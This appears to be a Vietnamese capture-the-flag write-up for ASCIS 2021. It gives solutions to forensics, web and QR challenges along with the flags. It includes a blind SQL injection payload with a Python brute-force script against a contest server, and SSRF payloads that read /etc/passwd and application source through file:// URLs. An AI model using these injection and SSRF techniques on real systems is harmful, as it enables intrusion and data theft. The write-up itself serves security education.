# ASEAN STUDENT CONTEST ON INFORMATION SECURITY 2021

### Overview
 | Title | Category | Points | Flag
 | ------ | ------ | ------ | ------ |
 | [Hello world](#Hello-world) | MISC | 100 | `ASCIS{th1$_1$_4_fl4g}` |
 | [PNG](#PNG) | MISC | 100 | `ASCIS{png_h1dd3n_d4t4}` |
 | [travel paper](#travel-paper) | MISC | 100 | `ASCIS{c0r0n4_v1rus_1s_g0n3}` |
 | [Sherlock Homes](#Sherlock-Homes) | MISC | 451 | `Chưa tìm được` |
 | [FSM](#FSM) | RE | 100 |  |
 | [trace me](#trace-me) | RE | 139 |  |
 | [ghost reg](#ghost-reg) | RE | 436 |  |
 | [script kiddie](#script-kiddie) | WEB | 100 | `ASCIS{ssalchtiwesmihcueymor}` |
 | [OProxy](#OProxy) | WEB | 400 | ASCIS{SSRF_M3mcached_inj3cti0n} |
 | [isolate](#isolate) | WEB | 475 |  |
 
# Hello world
 
### Challenge
 
<img src=files/1.png>
 
### Solution

* Tìm trong source của trang web.

<img src=files/2.png>

# PNG
 
### Challenge
 
<img src=files/3.png>

[vcs.png](files/vcs.png)

### Solution

* Ta nhận được file png.

<img src=files/4.png>

* Vậy cờ nằm ở phần còn lại của bức hình. Sử dụng công cụ [TweakPNG](http://entropymine.com/jason/tweakpng/) để thay đổi size hình.

<img src=files/5.png>

* Sau khi thay đổi, ta có phần còn lại của hình có chứa cờ.

<img src=files/6.png>

# travel paper
 
### Challenge
 
<img src=files/7.png>
 
### Solution

* Truy cập netcat ta được QR Code.

<img src=files/8.png>

* Viết chương trình tự động submit qr code.

*(Code này của anh Hiếu team mình, anh Hiếu code python để đọc QR Code xịn lắm nghen 😆)*

* Code bạn đọc tham khảo có thể lấy ở đây:
 * [qrcode_solve.py](files/qrcode_solve.py)
 * [clacon.ttf](files/clacon.ttf)

```python
#!/usr/bin/python3
from PIL import Image, ImageFont, ImageDraw
from pyzbar.pyzbar import decode


def qrimg(lines, filename, sub=1):
    size_ = 500
    font = ImageFont.truetype('clacon.ttf', size=20)  
    img=Image.new("RGBA", (size_, size_),(255,255,255))
    draw = ImageDraw.Draw(img)  
    y_text = 8
    for line in lines:  
        # line = unicode(line, "utf-8")
        width, height = font.getsize(line)
        draw.text((0,y_text),line,(0,0,0), font=font)  
        y_text += height - sub
        draw = ImageDraw.Draw(img)  
    img.save(filename)

# Hàm này nhận một dòng (line) từ socket
def receive_one_line(s):
    r = b''

    # Lần lượt nhận từng ký tự, nếu là ký tự xuống dòng thì ngưng
    while (True):
        t = s.recv(1)
        if t == b'\n': break
        r = r + t

    # Trả về kết quả dạng string
    return r.decode()

# Hàm này gửi một dòng (line) đến socket
def send_one_line(s, data):
    # Bỏ hết ký tự xuống dòng trong data (nếu có) và gửi đến server
    data = data.strip()
    s.send((data + '\n').encode())

import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('125.235.240.166',20123))

banner = receive_one_line(s)
print(banner)

while('ASCIS{' not in banner):
    banner = receive_one_line(s)
    print(banner)
    save = []
    if 'Person' in banner:
        banner = receive_one_line(s)
        banner = receive_one_line(s)
        banner = receive_one_line(s)
        while(banner.strip() != ''):
            print(banner)
            save.append(banner)
            banner = receive_one_line(s)

        data = ''
        flag = False
        sub = 0.8
        while(flag == False and sub < 1.1):
            print(f"Sub: {sub}")
            qrimg(save, 'sub.png', sub)
            data = decode(Image.open('sub.png'))[0].data.decode()
            # if there is a QR code
            # print the data
            if data != '':
                print(f"QRCode data: {data}")
                flag = True
            else:
                sub += 0.1
        
        data = data.split('|')
        send_one_line(s, data[0])
        send_one_line(s, data[1])
        send_one_line(s, data[2])


```

* Kết quả chạy đến qr code thứ 100 là có cờ.

<img src=files/9.png>

# Sherlock Homes
 
### Challenge
 
<img src=files/a.png>

[2021-10-15T084431_DESKTOP-558KS6A.zip](files/2021-10-15T084431_DESKTOP-558KS6A.zip)
 
### Solution

* Giải nén ra được file vhxd. Tiếp tục mount ra ổ đĩa ta được như sau.

<img src=files/b.png>

* Dùng lệnh `grep` để tìm file có chứa cờ.

<img src=files/c.png>

* Đọc file ta được thông tin sau: `D:\Work\CONFIDENTAL\ProjectX\2021\SECRET\ASCIS{NTF$_!S_G00D}.txt`

* Submit cờ thì không được. Đến đây thì chưa tìm được hướng giải.

# FSM
 
### Challenge
 
<img src=files/d.png>

[fsm_B6CB40CE8F1E1C0B71B376A259F42C8F.exe](files/fsm_B6CB40CE8F1E1C0B71B376A259F42C8F.exe)

# trace me
 
### Challenge
 
<img src=files/e.png>

[re02.zip](files/re02.zip)

# ghost reg
 
### Challenge
 
<img src=files/f.png>

[re01.zip](files/re01.zip)

# script kiddie
 
### Challenge
 
<img src=files/10.png>

### Solution

* Truy cập trang ta được nội dung sau.

<img src=files/11.png>

* Dùng sqlmap để dump database.

<img src=files/12.png>

* Kết quả là không dump được nhưng ta có được payload sau để inject.

`sort=(SELECT (CASE WHEN (8704=8704) THEN 'name' ELSE (SELECT 3137 UNION SELECT 5500) END))`

* Sửa lại payload để guess db_name như sau.

`sort=(SELECT+(CASE+WHEN+(1=2)+THEN+'name'+ELSE+(SELECT+len(db_name(0))+UNION+SELECT+22)+END))`

* db_name(0): là db thứ 1

* 22: là độ dài db name (số 22 này là mình bruteforce ra được)

* Code dùng để bruteforce như sau.

```python
import time
import requests
import string

# proxyDict = {"http":"http://127.0.0.1:8080"}

#Get length db_name()
def database_len(i):
	flag = True
	j = 0
	while flag == True:
		url = "http://167.172.85.253/web100/?sort=(SELECT+(CASE+WHEN+(1=2)+THEN+'name'+ELSE+(SELECT+len(db_name({}))+UNION+SELECT+{})+END))".format(i, j)
		# response = requests.get(url, proxies=proxyDict)
		response = requests.get(url)
		if "Error" not in response.text:
			flag = False
			break
		j = j + 1			
	return j		
			
#Bruteforce 10 db_name()			
def database_name():
	print('Brute force Database name...')
	for dlen in range(0,10):
		length = database_len(dlen)
		text = "db_name({}): {}".format(dlen, length)
		print(text)
		i = 1
		name = ""
		while i < length:
			for j in string.printable:
				url = "http://167.172.85.253/web100/?sort=(SELECT+(CASE+WHEN+(1=2)+THEN+'name'+ELSE+(SELECT+ascii(substring(db_name({}),{},1))+UNION+SELECT+ascii('{}'))+END))".format(dlen, i, j)
				# response = requests.get(url, proxies=proxyDict)
				response = requests.get(url)
				if "Error" not in response.text:
					name = name + j
					i = i + 1
					print(name)
					break	
		print("Database name is:", name)

def main():
    database_name()

if __name__ == '__main__':
    	main()


```

* Kết quả ta có được db_name

```
Brute force Database name...
db_name(0): 22
s
ss
ssa
ssal
ssalc
ssalch
ssalcht
ssalchti
ssalchtiw
ssalchtiwe
ssalchtiwes
ssalchtiwesm
ssalchtiwesmi
ssalchtiwesmih
ssalchtiwesmihc
ssalchtiwesmihcu
ssalchtiwesmihcue
ssalchtiwesmihcuey
ssalchtiwesmihcueym
ssalchtiwesmihcueymo
ssalchtiwesmihcueymor
Database name is: ssalchtiwesmihcueymor
```

# OProxy
 
### Challenge
 
<img src=files/13.png>

### Solution

* Truy cập trang ta được một page login

<img src=files/14.png>

* Đăng ký tài khoản và login, vào page proxy ta được input sau.

<img src=files/15.png>

* Nhập vào một vài URL, page chuyển hướng đến URL mà ta nhập. Ở đây guess là các yêu cầu phía máy chủ được sử dụng để tìm nạp tài nguyên và đưa nó vào ứng dụng web.

* Fuz với `file://127.0.0.1//etc/passwd` để xác định lỗi SSRF.

<img src=files/16.png>

* Thử RCE với công cụ Gopherus, tuy nhiên khi scan port với nmap lại không phát hiện port dịch vụ phù hợp có thể khai thác.

<img src=files/17.png>

* Lục lại request bằng Burp Suite. Phát hiện có 1 URL được GET lúc login vào.

<img src=files/18.png>

* Truy cập thử không được. Thử đọc file từ phía server bằng page proxy.

`file://127.0.0.1//app/staticatic/img/flag.jpg` -> request error

* View page-source ta thấy có phần debug

<img src=files/19.png>

* Mở debug và fuz.

<img src=files/1a.png>

* Nội dung file flag.jpg

```
b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x84\x00\t\t\n\x08\n\x08\x0b\x0b\t\x0b\n\x0b\x0b\x0b\x0e\x10\x0c\n\x0b\r\x13\x17\x15\x10\x14\x0f\x16\x12\x12\x0e\x16\x12\x0f\x14\x0f\x0f\x14\x12\x14\x18\x13\x16\x14\x19 \x1a\x1e\x19\x18+!\x1c$\x13\x1c\x1d2"3*7%"0\x01\x06\x0b\n\x0b\r\x0e\x0b\x0c\x0c\x0e\x0e\x0c\r\x10\x0e\x1d\x14\r\x0c"\x14\x15\x17\x0e\x1e\x08\x17\x0c\x10\x16\x10\x11\x17\x0b\x10\x13\x14\x0b\x11\x19\x11\x1e\t\x19\x0c\x08"\x18\x1d\x14\x0f\x1d\x10\r\x0c\x0f\x16\x10\x0b\x14\x15#\x16\x18\xff\xc2\x00\x11\x08\x04\x12\x04J\x03\x01"\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x1c\x00\x01\x00\x02\x02\x03\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x07\x04\x05\x06\x08\xff\xda\x00\x08\x01\x01\x00\x00\x00\x00\xde<O\x17\xdaz\xa4\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n|\xb9\xd5\xfa\xbd\xbb\xecd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00u\xbf%\xe6\xf6\xbbO\xdb\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8f\x9a\xbc\xb7\xa4\xdc\xde\xd4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1agQ\xfa\xed\xd3\xea\xa4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004&\xb9\xee6V\xdc\xb8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x-\r\xed\xb6\x1f\xbc\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\xfc\xfd\xef\xb6fB@\x00\x00\x00\x00\x00\x00\x11\x8a\x94\x98\xb5\xb2ZI\x00\x00\x00\x00\x00\x00"\xb7\x03\x81\xa1\xbd\x7f\xbba\xa4\xcel\xb9\xf9\x19\xaf B\x94\xacS\x1d&.\xb4\xdb6d\x80\x00\x028\xfduD\x04\xdar^\xd7\xb6\\\x92\x90\x00\x00\x00\x00\x88\xa5q\xf1x}\xde`u\x9a#\xd2\xecZ1\xe1\xc3\x8f\x1e:\xd6\xd6\xbeK](\x81[&\xd92\xe5\xbd\xdc\x8evi\x00\x00\x88\xc5\x83\x8d\x84\x00\x04\x10\xbe|\xb92\xe5\x99\x00\x00\x00\x06>7\x17\x04\xcdb\x9e\x82\xc0|\xfb\xd8\xedn<\xa2\xb4\xc7\x8a\x98\xe9JV&\xd7\xc9\x92\xf7\xb4\xd6%\x14\xac\xe4\xcb\x97-\xf9\xb9r^\xd6%\n\xc5+\x8f\x1e,P@\x88BS$\x04$\x89\xcb\xc9\xcd\xc8\x99\x00\x00\x01^\'\x06!0\xc1_L\x03E\xf1w?\x06\xcb\x15\x8ac\xa5)JR\xb4\x89\xbe\\\xb92\\\x98\xa6,T_-\xf9\x19f\xd6\xc90R\x08\x88\x81\x11X\x8a\xd3\x1c/{^\xf3k$\n\xcc\xc6(\xcf\xc8\xe4\xf2\xac\x00\x00b\xe3\xf11\xc1#\x1f\x1f\xbc\xe6\x01\xa7|\xc6\xf5\xeb/)\xb4\xab\x15\xa5iLu\xad)J-\x93>i\x9b]Lx\xf1bM\xaf6\xbd\xe6d\x92R\x88\xadb\xb0\xade+Z\xd92^\xf33$\x12c\xc6\xbeN_ai\x8cs3\x11KdLqx\x98Eiy\x921\xe7\xee\x80\xd4\xfe\x0b\xe8\x1e\xb2n\x99\x99\x11X\xad+J\xd2\x94\xae:Vo\x93-\xf2^\xf1Lx\xf1\xd2\xb5\x82KL\xcd\xadk\x08@\x88\x99\xb2%{^\xd7\xbc\xdaf@\x8cx\xef3x\xc7|V\xceW\x89\xc9\xe5r8\x94\x84L\xd7\x05\xf2\xc8\xa4w\xf2\ro\xaa>\x89\xeb\xa6\xe1kLLB"\xb5\xa5kJV\x94\xc7D\xe4\xcd\x975\xe6kX\xadb\x95\xaa\xb5\xac"n\xb4\xcd\x82\xb1k\xdebI-{d\xb4\xdaI\x08\xc7B\x19rp\xf9W:\x9c\xd3\xc9\xcb$c_\x04g\xb8\xae>\xdb\x98\x0f\t\xa5\xfe\x87\xe3E\xa4JfdU\x15V)\x14\xa51\xd6\x94\xac\xe4\xcd\xc8\xcb\x92\xd6\x02\xb1\x15\xc7Lt\xc7Z\xc2\xd6\x94-\x92\xf2L\xa2!7\xb5\xafy\xb4\xcaD)\x89|\x96\x8e?)<>\x1enU\xad3\x18\xa6197\x18\xe9\xcb\xee\x01\xe4\xf4\x1f\xd0\xb6\xc3k\x016\x94\x84B"\xb1J\xd2\xb4\xa5i\x8a\xb3|\xf9\xf2\xe4\xbd\xee\x02\xb5\xa5i\x8a+J\xc2\xd7\xb5\xc8%\x08\x88\x89\xb5\xaf{^m`C\x1e+\xe4\xbe+\xdex\xbdW7\x93\\y3\xca\x98\xb0\xe5\xe5'
```

* Convert sang hình. Sử dụng 2 file python: file 1 chứa nội dung jpg ở kiểu bytes đặt tên là flag.py và file 2 dùng đọc nội dung từ flag.py và convert về flag.jpg

```
# flag.py
bytesarray = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x84\x00\t\t\n\x08\n\x08\x0b\x0b\t\x0b\n\x0b\x0b\x0b\x0e\x10\x0c\n\x0b\r\x13\x17\x15\x10\x14\x0f\x16\x12\x12\x0e\x16\x12\x0f\x14\x0f\x0f\x14\x12\x14\x18\x13\x16\x14\x19 \x1a\x1e\x19\x18+!\x1c$\x13\x1c\x1d2"3*7%"0\x01\x06\x0b\n\x0b\r\x0e\x0b\x0c\x0c\x0e\x0e\x0c\r\x10\x0e\x1d\x14\r\x0c"\x14\x15\x17\x0e\x1e\x08\x17\x0c\x10\x16\x10\x11\x17\x0b\x10\x13\x14\x0b\x11\x19\x11\x1e\t\x19\x0c\x08"\x18\x1d\x14\x0f\x1d\x10\r\x0c\x0f\x16\x10\x0b\x14\x15#\x16\x18\xff\xc2\x00\x11\x08\x04\x12\x04J\x03\x01"\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x1c\x00\x01\x00\x02\x02\x03\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x07\x04\x05\x06\x08\xff\xda\x00\x08\x01\x01\x00\x00\x00\x00\xde<O\x17\xdaz\xa4\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n|\xb9\xd5\xfa\xbd\xbb\xecd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00u\xbf%\xe6\xf6\xbbO\xdb\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8f\x9a\xbc\xb7\xa4\xdc\xde\xd4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1agQ\xfa\xed\xd3\xea\xa4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004&\xb9\xee6V\xdc\xb8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x-\r\xed\xb6\x1f\xbc\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\xfc\xfd\xef\xb6fB@\x00\x00\x00\x00\x00\x00\x11\x8a\x94\x98\xb5\xb2ZI\x00\x00\x00\x00\x00\x00"\xb7\x03\x81\xa1\xbd\x7f\xbba\xa4\xcel\xb9\xf9\x19\xaf B\x94\xacS\x1d&.\xb4\xdb6d\x80\x00\x028\xfduD\x04\xdar^\xd7\xb6\\\x92\x90\x00\x00\x00\x00\x88\xa5q\xf1x}\xde`u\x9a#\xd2\xecZ1\xe1\xc3\x8f\x1e:\xd6\xd6\xbeK](\x81[&\xd92\xe5\xbd\xdc\x8evi\x00\x00\x88\xc5\x83\x8d\x84\x00\x04\x10\xbe|\xb92\xe5\x99\x00\x00\x00\x06>7\x17\x04\xcdb\x9e\x82\xc0|\xfb\xd8\xedn<\xa2\xb4\xc7\x8a\x98\xe9JV&\xd7\xc9\x92\xf7\xb4\xd6%\x14\xac\xe4\xcb\x97-\xf9\xb9r^\xd6%\n\xc5+\x8f\x1e,P@\x88BS$\x04$\x89\xcb\xc9\xcd\xc8\x99\x00\x00\x01^\'\x06!0\xc1_L\x03E\xf1w?\x06\xcb\x15\x8ac\xa5)JR\xb4\x89\xbe\\\xb92\\\x98\xa6,T_-\xf9\x19f\xd6\xc90R\x08\x88\x81\x11X\x8a\xd3\x1c/{^\xf3k$\n\xcc\xc6(\xcf\xc8\xe4\xf2\xac\x00\x00b\xe3\xf11\xc1#\x1f\x1f\xbc\xe6\x01\xa7|\xc6\xf5\xeb/)\xb4\xab\x15\xa5iLu\xad)J-\x93>i\x9b]Lx\xf1bM\xaf6\xbd\xe6d\x92R\x88\xadb\xb0\xade+Z\xd92^\xf33$\x12c\xc6\xbeN_ai\x8cs3\x11KdLqx\x98Eiy\x921\xe7\xee\x80\xd4\xfe\x0b\xe8\x1e\xb2n\x99\x99\x11X\xad+J\xd2\x94\xae:Vo\x93-\xf2^\xf1Lx\xf1\xd2\xb5\x82KL\xcd\xadk\x08@\x88\x99\xb2%{^\xd7\xbc\xdaf@\x8cx\xef3x\xc7|V\xceW\x89\xc9\xe5r8\x94\x84L\xd7\x05\xf2\xc8\xa4w\xf2\ro\xaa>\x89\xeb\xa6\xe1kLLB"\xb5\xa5kJV\x94\xc7D\xe4\xcd\x975\xe6kX\xadb\x95\xaa\xb5\xac"n\xb4\xcd\x82\xb1k\xdebI-{d\xb4\xdaI\x08\xc7B\x19rp\xf9W:\x9c\xd3\xc9\xcb$c_\x04g\xb8\xae>\xdb\x98\x0f\t\xa5\xfe\x87\xe3E\xa4JfdU\x15V)\x14\xa51\xd6\x94\xac\xe4\xcd\xc8\xcb\x92\xd6\x02\xb1\x15\xc7Lt\xc7Z\xc2\xd6\x94-\x92\xf2L\xa2!7\xb5\xafy\xb4\xcaD)\x89|\x96\x8e?)<>\x1enU\xad3\x18\xa6197\x18\xe9\xcb\xee\x01\xe4\xf4\x1f\xd0\xb6\xc3k\x016\x94\x84B"\xb1J\xd2\xb4\xa5i\x8a\xb3|\xf9\xf2\xe4\xbd\xee\x02\xb5\xa5i\x8a+J\xc2\xd7\xb5\xc8%\x08\x88\x89\xb5\xaf{^m`C\x1e+\xe4\xbe+\xdex\xbdW7\x93\\y3\xca\x98\xb0\xe5\xe5'
```

```python
# bytes_to_jpg.py
from flag import bytesarray

with open("flag.jpg", "wb") as f:
    f.write(bytesarray)
```

* Mở file hình sau khi convert.

<img src=files/flag.png>

* Éc éc 😱. Stuck rồi. Bài này mình xem lại sau ngày thi, khi có thời gian xem lại thì chợt nhớ là mình khai thác được SSRF rồi sao không mò tiếp các file lân cận.

* Cấu trúc một project Flask đơn giản như sau

<img src=files/1b.png>

* Xem một hồi thì thấy file này /app/app/__init__.py

```python
import os

from flask import Flask
from flask_login import LoginManager
from flask_sqlalchemy import SQLAlchemy
from pymemcache import Client
from sqlalchemy import text

from config import Config

db = SQLAlchemy()
# Set up Flask-login
login_manager = LoginManager()
cache_host = 'localhost'
pmc = Client(cache_host)
pmc2 = Client(cache_host)
memdeamon_default_key = "bietDauBatNgoDoiTaChotRoiXaNhau.AiConDungDuoiMuaNganNgaCauRuTinh"


def create_app():
    """For to use dynamic environment"""
    app = Flask(__name__)
    app.config.from_object(Config)
    login_manager.init_app(app)
    login_manager.login_view = 'auth.login'
    login_manager.login_message = 'Please log in to access this page.'
    db.init_app(app)
    with app.app_context():
        create_flag()
    # Register blueprint(s)
    # app.register_blueprint(xyz_module)
    from app.controller.auth_controller import auth_mod
    from app.controller.home_controller import home_mod
    from app.controller.history_controller import history_mod
    from app.controller.proxy_controller import proxy_mod
    app.register_blueprint(auth_mod)
    app.register_blueprint(home_mod)
    app.register_blueprint(history_mod)
    app.register_blueprint(proxy_mod)
    return app


def create_flag():
    with open('flag.txt', 'r') as f:
        flag = f.read().replace('\n', '').replace('\r', '').replace('\'', '').replace('\"', '')
        print("Flag: " + flag)
        sql = text('SELECT * FROM flag')
        result = db.engine.execute(sql)
        r = 0
        if result:
            for row in result:
                r += 1
        if r == 0:
            sql = text('INSERT INTO flag (id,flag) VALUES (1,"%s")' % flag)
            db.engine.execute(sql)
        else:
            sql = text('UPDATE flag SET flag = "%s" WHERE id = 1' % flag)
            db.engine.execute(sql)
```

* Ta thấy chương trình mở 1 file flag.txt. Vậy truy cập vào /app/flag.txt

* Ta có được cờ

<img src=files/1c.png>

